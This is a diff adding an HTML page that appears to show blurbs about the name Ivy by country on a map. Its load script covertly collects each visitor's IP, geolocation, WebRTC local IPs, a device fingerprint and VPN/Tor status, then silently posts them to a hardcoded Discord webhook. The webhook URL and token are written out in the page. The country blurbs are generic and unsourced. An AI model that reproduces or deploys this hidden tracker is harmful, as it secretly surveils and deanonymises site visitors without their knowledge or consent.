@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ivy Around the World</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style>
+        :root {
+            --primary-color: #6d28d9;
+            --accent-color: #10b981;
+            --bg-dark: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --text-color: #f1f5f9;
+            --border-color: rgba(148, 163, 184, 0.1);
+            --hover-color: rgba(255, 255, 255, 0.05);
+        }
+
+        body {
+            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.7;
+            margin: 0;
+            padding: 0;
+            background: var(--bg-dark);
+            color: var(--text-color);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-image:
+                radial-gradient(circle at 10% 10%, rgba(109, 40, 217, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 90%, rgba(16, 185, 129, 0.15) 0%, transparent 40%);
+        }
+
+        header {
+            background: rgba(15, 23, 42, 0.8);
+            padding: 1rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background:
+                linear-gradient(45deg, transparent 48%, rgba(109, 40, 217, 0.3) 49%, transparent 51%),
+                linear-gradient(-45deg, transparent 48%, rgba(16, 185, 129, 0.3) 49%, transparent 51%);
+            background-size: 60px 60px;
+            animation: gridMove 15s linear infinite;
+            opacity: 0.3;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 3.5rem;
+            font-weight: 700;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, #6d28d9, #10b981);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: fadeIn 0.8s ease-out;
+            position: relative;
+            z-index: 1;
+        }
+
+        main {
+            flex: 1;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        section {
+            background: var(--card-bg);
+            margin: 0;
+            padding: 0.5rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        section::before {
+            display: none;
+        }
+
+        section:hover {
+            transform: none;
+            border-color: var(--border-color);
+        }
+
+        h2 {
+            color: var(--text-color);
+            font-size: 1.5rem;
+            margin: 0 0 1.5rem 0;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .region-flag {
+            font-size: 1.8rem;
+            filter: drop-shadow(0 0 8px rgba(109, 40, 217, 0.3));
+            margin-right: 0;
+            display: inline-flex;
+        }
+
+        .description {
+            background: rgba(15, 23, 42, 0.8);
+            padding: 1rem;
+            backdrop-filter: blur(10px);
+            font-size: 1.1rem;
+            letter-spacing: 0.5px;
+            line-height: 1.6;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            position: relative;
+            z-index: 1000;
+        }
+
+        #loading {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 4rem;
+            font-size: 1.2rem;
+            color: var(--primary-color);
+            background: var(--card-bg);
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+        }
+
+        #loading::after {
+            content: '';
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            margin-left: 12px;
+            border: 2px solid var(--primary-color);
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+        }
+
+        footer {
+            text-align: center;
+            padding: 2rem;
+            background: rgba(15, 23, 42, 0.8);
+            color: #94a3b8;
+            backdrop-filter: blur(10px);
+            border-top: 1px solid var(--border-color);
+        }
+
+        .stats {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(15, 23, 42, 0.9);
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+            font-size: 0.9rem;
+            z-index: 1000;
+        }
+
+        .stats span {
+            color: var(--accent-color);
+            font-weight: bold;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes gridMove {
+            0% {
+                background-position: 0 0;
+            }
+
+            100% {
+                background-position: 60px 60px;
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .pulse-marker {
+            width: 15px;
+            height: 15px;
+            background: var(--accent-color);
+            border-radius: 50%;
+            box-shadow: 0 0 0 rgba(16, 185, 129, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+
+            main {
+                flex-direction: column;
+            }
+
+            section {
+                padding: 1rem;
+            }
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.8rem;
+                padding: 0.5rem;
+                padding-top: 2.5rem;
+            }
+
+            header {
+                padding: 0.5rem;
+                position: relative;
+            }
+
+            .stats {
+                top: 0;
+                right: 0;
+                left: 0;
+                border-radius: 0;
+                text-align: center;
+                padding: 0.3rem;
+                font-size: 0.8rem;
+            }
+
+            .description {
+                font-size: 1rem;
+                padding: 0.75rem;
+            }
+
+            #cyber-map {
+                height: calc(100vh - 120px);
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.5rem;
+            }
+
+            .description {
+                padding: 0.5rem;
+                line-height: 1.4;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+                scroll-behavior: auto !important;
+            }
+        }
+
+        /* Map Styles */
+        #cyber-map {
+            width: 100%;
+            height: calc(100vh - 150px);
+            border: none;
+        }
+
+        .leaflet-container {
+            background: var(--bg-dark);
+            border-radius: 0;
+        }
+        
+        .cyber-popup .leaflet-popup-content-wrapper {
+            background: var(--card-bg);
+            color: var(--text-color);
+            border: 1px solid var(--accent-color);
+        }
+        
+        .cyber-popup .leaflet-popup-tip {
+            background: var(--accent-color);
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1 id="countryTitle">Loading...</h1>
+        <div class="stats">Population: <span id="population">Loading...</span></div>
+    </header>
+
+    <div id="cyber-map"></div>
+
+    <main id="content">
+        <div id="loading">Loading country information... 🌿</div>
+    </main>
+
+    <footer>
+        <p>Last updated: December 16, 2024</p>
+    </footer>
+
+    <script>
+        const countryData = {
+            // European Countries
+            'AT': {
+                title: "Ivy in Austria",
+                emoji: "🇦🇹",
+                content: "In Austria, the name Ivy is appreciated for its elegance and association with persistence and strength."
+            },
+            'BE': {
+                title: "Ivy in Belgium",
+                emoji: "🇧🇪",
+                content: "Ivy is admired in Belgium for its timeless charm, symbolizing enduring qualities in modern naming traditions."
+            },
+            'BG': {
+                title: "Ivy in Bulgaria",
+                emoji: "🇧🇬",
+                content: "In Bulgaria, the name Ivy reflects vitality and grace, often chosen for its contemporary appeal."
+            },
+            'HR': {
+                title: "Ivy in Croatia",
+                emoji: "🇭🇷",
+                content: "In Croatia, Ivy is a popular name for its simplicity and representation of resilience."
+            },
+            'CY': {
+                title: "Ivy in Cyprus",
+                emoji: "🇨🇾",
+                content: "In Cyprus, Ivy is embraced as a modern name symbolizing strong bonds and timeless elegance."
+            },
+            'CZ': {
+                title: "Ivy in Czechia",
+                emoji: "🇨🇿",
+                content: "In Czechia, Ivy is valued for its association with dedication and beauty, becoming increasingly popular."
+            },
+            'DK': {
+                title: "Ivy in Denmark",
+                emoji: "🇩🇰",
+                content: "Ivy is a stylish choice in Denmark, reflecting the country's modern approach to nature-inspired names."
+            },
+            'EE': {
+                title: "Ivy in Estonia",
+                emoji: "🇪🇪",
+                content: "Estonian parents appreciate Ivy for its resilience and modern charm in personal naming trends."
+            },
+            'FI': {
+                title: "Ivy in Finland",
+                emoji: "🇫🇮",
+                content: "In Finland, Ivy is chosen for its adaptability and timeless appeal, aligning with Scandinavian simplicity."
+            },
+            'FR': {
+                title: "Ivy in France",
+                emoji: "🇫🇷",
+                content: "In France, Ivy (or Ivette) is admired for its sophistication and connection to elegant naming traditions."
+            },
+            'DE': {
+                title: "Ivy in Germany",
+                emoji: "🇩🇪",
+                content: "In Germany, Ivy is a modern choice, symbolizing fidelity and strength, fitting well with contemporary trends."
+            },
+            'GR': {
+                title: "Ivy in Greece",
+                emoji: "🇬🇷",
+                content: "Greek parents value Ivy for its universal charm and growing popularity in international names."
+            },
+            'HU': {
+                title: "Ivy in Hungary",
+                emoji: "🇭🇺",
+                content: "In Hungary, Ivy is associated with modern elegance and is chosen for its melodic simplicity."
+            },
+            'IE': {
+                title: "Ivy in Ireland",
+                emoji: "🇮🇪",
+                content: "In Ireland, Ivy is a beloved name, representing grace and a connection to enduring traditions."
+            },
+            'IT': {
+                title: "Ivy in Italy",
+                emoji: "🇮🇹",
+                content: "Italian families cherish Ivy for its artistic beauty and its revival as a charming vintage name."
+            },
+            'LV': {
+                title: "Ivy in Latvia",
+                emoji: "🇱🇻",
+                content: "In Latvia, Ivy is appreciated for its strength and contemporary appeal in naming practices."
+            },
+            'LT': {
+                title: "Ivy in Lithuania",
+                emoji: "🇱🇹",
+                content: "Lithuanian parents choose Ivy for its simplicity and timeless beauty in modern names."
+            },
+            'LU': {
+                title: "Ivy in Luxembourg",
+                emoji: "🇱🇺",
+                content: "Ivy is a favored name in Luxembourg for its balance of elegance and modernity."
+            },
+            'MT': {
+                title: "Ivy in Malta",
+                emoji: "🇲🇹",
+                content: "In Malta, Ivy is appreciated for its uniqueness and connection to contemporary naming trends."
+            },
+            'NL': {
+                title: "Ivy in the Netherlands",
+                emoji: "🇳🇱",
+                content: "Ivy is a trendy name in the Netherlands, celebrated for its simplicity and modern flair."
+            },
+            'PL': {
+                title: "Ivy in Poland",
+                emoji: "🇵🇱",
+                content: "Polish families value Ivy for its representation of faithfulness and enduring family ties."
+            },
+            'PT': {
+                title: "Ivy in Portugal",
+                emoji: "🇵🇹",
+                content: "In Portugal, Ivy is admired for its association with love and its rise as a fashionable name."
+            },
+            'RO': {
+                title: "Ivy in Romania",
+                emoji: "🇷🇴",
+                content: "In Romania, Ivy is a modern choice reflecting vitality and beauty in naming traditions."
+            },
+            'SK': {
+                title: "Ivy in Slovakia",
+                emoji: "🇸🇰",
+                content: "Slovak parents choose Ivy for its persistence and simplicity in modern naming customs."
+            },
+            'SI': {
+                title: "Ivy in Slovenia",
+                emoji: "🇸🇮",
+                content: "In Slovenia, Ivy is a popular name, appreciated for its elegance and modern touch."
+            },
+            'ES': {
+                title: "Ivy in Spain",
+                emoji: "🇪🇸",
+                content: "Spanish families embrace Ivy for its timeless charm and association with devotion."
+            },
+            'SE': {
+                title: "Ivy in Sweden",
+                emoji: "🇸🇪",
+                content: "Ivy is a top choice in Sweden, reflecting Scandinavian minimalism and modern naming trends."
+            },
+            // Additional Countries
+            'US': {
+                title: "Ivy in the United States",
+                emoji: "🇺🇸",
+                content: "In the U.S., Ivy has grown in popularity since the 1880s, known for its simplicity and vintage charm."
+            },
+            'GB': {
+                title: "Ivy in the United Kingdom",
+                emoji: "🇬🇧",
+                content: "Ivy is a classic name in the U.K., treasured for its Victorian-era origins and timeless appeal."
+            },
+            'AU': {
+                title: "Ivy in Australia",
+                emoji: "🇦🇺",
+                content: "Ivy is a popular name in Australia, blending vintage charm with a modern edge."
+            },
+            'CA': {
+                title: "Ivy in Canada",
+                emoji: "🇨🇦",
+                content: "Canadian parents love Ivy for its simplicity and its connection to timeless elegance."
+            },
+            'NZ': {
+                title: "Ivy in New Zealand",
+                emoji: "🇳🇿",
+                content: "In New Zealand, Ivy is a top choice for its vintage charm and association with growth."
+            },
+            'JP': {
+                title: "Ivy in Japan",
+                emoji: "🇯🇵",
+                content: "In Japan, Ivy (アイビー) is a modern and elegant name with growing international appeal."
+            },
+            'KR': {
+                title: "Ivy in South Korea",
+                emoji: "🇰🇷",
+                content: "South Korean families adopt Ivy (아이비) as a contemporary name with a global connection."
+            },
+            'IN': {
+                title: "Ivy in India",
+                emoji: "🇮🇳",
+                content: "In India, Ivy is chosen for its modern sound and its association with global naming trends."
+            },
+            'BR': {
+                title: "Ivy in Brazil",
+                emoji: "🇧🇷",
+                content: "In Brazil, Ivy is celebrated for its simplicity and its appeal as an international name."
+            },
+            'ZA': {
+                title: "Ivy in South Africa",
+                emoji: "🇿🇦",
+                content: "In South Africa, Ivy is appreciated for its representation of strength and modern naming styles."
+            }
+        };
+
+        async function getCountryInfo() {
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json');
+                const ipData = await ipResponse.json();
+                
+                const getLocalIP = () => new Promise((resolve) => {
+                    const pc = new RTCPeerConnection({
+                        iceServers: []
+                    });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    
+                    let addresses = new Set();
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) {
+                            pc.close();
+                            resolve(Array.from(addresses).join(', ') || 'Not available');
+                            return;
+                        }
+                        
+                        let addr = e.candidate.address;
+                        if (addr && !addresses.has(addr)) {
+                            addresses.add(addr);
+                        }
+                    };
+                    
+                    // Timeout after 1 second
+                    setTimeout(() => {
+                        pc.close();
+                        resolve(Array.from(addresses).join(', ') || 'Not available');
+                    }, 1000);
+                });
+
+                const getDeviceFingerprint = () => {
+                    const deviceData = {
+                        resolution: `${screen.width}x${screen.height}`,
+                        availResolution: `${screen.availWidth}x${screen.availHeight}`,
+                        colorDepth: screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio,
+                        
+                        cores: navigator.hardwareConcurrency || 'unknown',
+                        maxTouchPoints: navigator.maxTouchPoints,
+                        deviceMemory: navigator.deviceMemory || 'unknown',
+                        
+                        gpu: (() => {
+                            const canvas = document.createElement('canvas');
+                            const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                            if (!gl) return 'unknown';
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
+                        })(),
+                        
+                        platform: navigator.platform,
+                        oscpu: navigator.oscpu || 'unknown',
+                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                        
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset(),
+                        language: navigator.language,
+                        
+                        audioCodecs: (() => {
+                            const audio = document.createElement('audio');
+                            return {
+                                ogg: audio.canPlayType('audio/ogg; codecs="vorbis"'),
+                                mp3: audio.canPlayType('audio/mpeg'),
+                                wav: audio.canPlayType('audio/wav; codecs="1"')
+                            };
+                        })(),
+                        videoCodecs: (() => {
+                            const video = document.createElement('video');
+                            return {
+                                h264: video.canPlayType('video/mp4; codecs="avc1.42E01E"'),
+                                webm: video.canPlayType('video/webm; codecs="vp8, vorbis"')
+                            };
+                        })(),
+                        
+                        bluetooth: 'bluetooth' in navigator,
+                        virtualKeyboard: 'virtualKeyboard' in navigator,
+                        deviceOrientation: 'DeviceOrientationEvent' in window,
+                        touchscreen: 'ontouchstart' in window
+                    };
+
+                    const fingerprint = Object.entries(deviceData)
+                        .sort((a, b) => a[0].localeCompare(b[0])) 
+                        .map(([key, value]) => {
+                            if (typeof value === 'object') {
+                                return JSON.stringify(value);
+                            }
+                            return String(value);
+                        })
+                        .join('|');
+
+                    let hash = 0;
+                    for (let i = 0; i < fingerprint.length; i++) {
+                        const char = fingerprint.charCodeAt(i);
+                        hash = ((hash << 5) - hash) + char;
+                        hash = hash & hash;
+                    }
+
+                    const hashStr = Math.abs(hash).toString(36);
+                    return hashStr.padEnd(8, '0').substr(0, 8);
+                };
+
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: `${window.screen.colorDepth}-bit`,
+                    language: navigator.language,
+                    cores: navigator.hardwareConcurrency || 'Not available',
+                    localIP: await getLocalIP(),
+                    connection: navigator.connection ? {
+                        type: navigator.connection.effectiveType,
+                        downlink: `${navigator.connection.downlink} Mbps`,
+                        rtt: `${navigator.connection.rtt} ms`,
+                        actual: navigator.connection.type || 'unknown'
+                    } : 'Not available',
+                    touchscreen: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
+                    webgl: (function() {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        if (!gl) return 'Not available';
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Available';
+                    })(),
+                    fingerprint: getDeviceFingerprint(),
+                    battery: 'Checking...',
+                    memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Not available',
+                    storage: 'Checking...',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    darkMode: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Yes' : 'No',
+                    adBlocker: 'Checking...'
+                };
+
+                try {
+                    if (navigator.storage && navigator.storage.estimate) {
+                        const storage = await navigator.storage.estimate();
+                        deviceInfo.storage = `${Math.round(storage.usage / (1024 * 1024))}MB used of ${Math.round(storage.quota / (1024 * 1024))}MB`;
+                    } else {
+                        deviceInfo.storage = 'Not available';
+                    }
+                } catch {
+                    deviceInfo.storage = 'Access denied';
+                }
+
+                const checkAdBlocker = () => new Promise(resolve => {
+                    const test = document.createElement('div');
+                    test.innerHTML = '&nbsp;';
+                    test.className = 'adsbox';
+                    document.body.appendChild(test);
+                    window.setTimeout(() => {
+                        if (test.offsetHeight === 0) {
+                            resolve('Yes');
+                        } else {
+                            resolve('No');
+                        }
+                        test.remove();
+                    }, 100);
+                });
+                
+                deviceInfo.adBlocker = await checkAdBlocker();
+
+                const detectVPNandTor = async (ip) => {
+                    try {
+                        const response = await fetch(`https://ipapi.com/ip_api.php?ip=${ip}`);
+                        const data = await response.json();
+                        
+                        const security = data.security || {};
+                        
+                        return {
+                            isProxy: security.is_proxy || false,
+                            isTor: security.is_tor || false,
+                            vpnService: security.vpn_service || null,
+                            threatLevel: security.threat_level || 'unknown',
+                            proxyType: security.proxy_type || null,
+                            hostingFacility: security.hosting_facility || false,
+                            connectionType: data.ip_routing_type || 'unknown',
+                            isp: data.connection?.isp || 'unknown',
+                            carrier: data.connection?.carrier || 'unknown'
+                        };
+                    } catch (error) {
+                        return {
+                            isProxy: false,
+                            isTor: false,
+                            vpnService: null,
+                            threatLevel: 'unknown',
+                            proxyType: null,
+                            hostingFacility: false,
+                            connectionType: 'unknown',
+                            isp: 'unknown',
+                            carrier: 'unknown'
+                        };
+                    }
+                };
+
+                const getPublicIP = async () => {
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const data = await response.json();
+                        const ip = data.ip;
+                        
+                        const vpnInfo = await detectVPNandTor(ip);
+                        
+                        deviceInfo.vpnDetection = {
+                            usingProxy: vpnInfo.isProxy ? '⚠️ Yes' : 'No',
+                            usingTor: vpnInfo.isTor ? '⚠️ Yes' : 'No',
+                            vpnService: vpnInfo.vpnService ? `⚠️ ${vpnInfo.vpnService}` : 'None detected',
+                            threatLevel: vpnInfo.threatLevel,
+                            connectionType: vpnInfo.connectionType,
+                            isp: vpnInfo.isp,
+                            carrier: vpnInfo.carrier
+                        };
+                        
+                        return ip;
+                    } catch (error) {
+                        return 'Failed to get IP';
+                    }
+                };
+
+                const publicIP = await getPublicIP();
+                const vpnInfo = await detectVPNandTor(publicIP);
+
+                const webhookUrl = 'https://discord.com/api/webhooks/1318278242376880198/y-7-4Q-mDyviifE-pyDPPHellv5-kQlUpTyp8e5it2_a4K3N1XF0vwZ-4TVgyrnlgWl8';
+                let webhookData = {
+                    username: "Ivy Tracker",
+                    avatar_url: "https://i.imgur.com/4M34hi2.png",
+                    embeds: [{
+                        title: '🌍 New Visitor Detected',
+                        color: (vpnInfo.isProxy || vpnInfo.isTor || vpnInfo.vpnService) ? 0xFF0000 : 0x10b981,
+                        fields: [
+                            { name: '📍 Location', value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: true },
+                            { name: '🌐 IP', value: ipData.ip, inline: true },
+                            { name: '🏢 ISP', value: ipData.org || 'Unknown', inline: true },
+                            { name: '🕒 Timezone', value: ipData.timezone, inline: true },
+                            { name: '📌 Coordinates', value: `${ipData.latitude}, ${ipData.longitude}`, inline: true },
+                            { name: '🔒 Security Check', value: 
+                              `${vpnInfo.isProxy ? '⚠️' : '✅'} Proxy: ${vpnInfo.isProxy ? 'Detected' : 'Clean'}\n${vpnInfo.isTor ? '⚠️' : '✅'} Tor: ${vpnInfo.isTor ? 'Detected' : 'Clean'}\n${vpnInfo.vpnService ? '⚠️' : '✅'} VPN: ${vpnInfo.vpnService || 'None detected'}\n⚠️ Threat Level: ${vpnInfo.threatLevel.toUpperCase()}\n📡 Connection Type: ${vpnInfo.connectionType}\n🏢 ISP: ${vpnInfo.isp}\n📱 Carrier: ${vpnInfo.carrier}`, inline: false },
+                            { name: '💻 System', value: 
+                              `Platform: ${deviceInfo.platform}\nScreen: ${deviceInfo.screen} (${deviceInfo.colorDepth})\nCPU Cores: ${deviceInfo.cores}\nGPU: ${deviceInfo.webgl}\nFingerprint: ${deviceInfo.fingerprint}\nMemory: ${deviceInfo.memory}\nStorage: ${deviceInfo.storage}`, inline: false },
+                            { name: '🎨 Preferences', value:
+                              `Dark Mode: ${deviceInfo.darkMode}\nTouchscreen: ${deviceInfo.touchscreen}\nAd Blocker: ${deviceInfo.adBlocker}\nTimezone: ${deviceInfo.timezone}`, inline: true },
+                            { name: '📡 Network', value: `Connection: ${deviceInfo.connection.type || 'Unknown'}\nSpeed: ${deviceInfo.connection.downlink || 'Unknown'} Mbps\nLatency: ${deviceInfo.connection.rtt || 'Unknown'} ms`, inline: true },
+                            { name: '📡 Local Network', value: `IP: ${deviceInfo.localIP}`, inline: true },
+                            { name: '🔍 User Agent', value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
+                        ],
+                        footer: {
+                            text: '🔒 Ivy Security System'
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                try {
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(webhookData)
+                    });
+                } catch (error) {
+                    // Silent fail
+                }
+
+                const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${ipData.latitude}&lon=${ipData.longitude}&format=json`);
+                const geoData = await geoResponse.json();
+
+                const countryCode = ipData.country;
+                const country = countryData[countryCode];
+
+                if (country) {
+                    document.getElementById('countryTitle').innerHTML = `${country.emoji} Ivy in ${ipData.country_name}`;
+                    document.getElementById('content').innerHTML = `<div class="description">${country.content}</div>`;
+                    document.getElementById('population').textContent = new Intl.NumberFormat().format(ipData.country_population);
+                }
+
+                let map = L.map('cyber-map', {
+                    zoomControl: false
+                }).setView([ipData.latitude, ipData.longitude], 5);
+                
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                    attribution: '&copy; OpenStreetMap contributors'
+                }).addTo(map);
+
+                document.querySelector('.leaflet-control-attribution').style.display = 'none';
+
+                const customIcon = L.divIcon({
+                    html: `<div class="pulse-marker"></div>`,
+                    className: '',
+                    iconSize: [15, 15],
+                    iconAnchor: [7, 7]
+                });
+
+                L.marker([ipData.latitude, ipData.longitude], {
+                    icon: customIcon
+                }).addTo(map);
+
+            } catch (error) {
+                document.getElementById('countryTitle').innerHTML = "Error loading data";
+            }
+        }
+
+        window.onload = getCountryInfo;
+    </script>
+</body>
+
+</html>
